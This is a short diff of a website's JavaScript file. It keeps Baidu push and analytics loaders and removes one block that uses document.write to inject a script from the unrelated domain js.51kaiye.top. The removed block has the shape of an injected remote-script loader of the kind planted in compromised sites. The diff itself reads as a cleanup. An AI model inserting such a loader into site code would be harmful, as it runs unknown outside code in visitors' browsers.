@@ -11,12 +11,6 @@ bp.src = 'http://push.zhanzhang.baidu.com/push.js';
 var s = document.getElementsByTagName("script")[0];
 s.parentNode.insertBefore(bp, s);
 })();
-(function(){
-var src = "//js.51kaiye.top/js/youhui.js";
-document.write('<script src="' + src + '" id="sozz"><\/script>');
-})();
-
-
 var _hmt = _hmt || [];
 (function() {
   var hm = document.createElement("script");
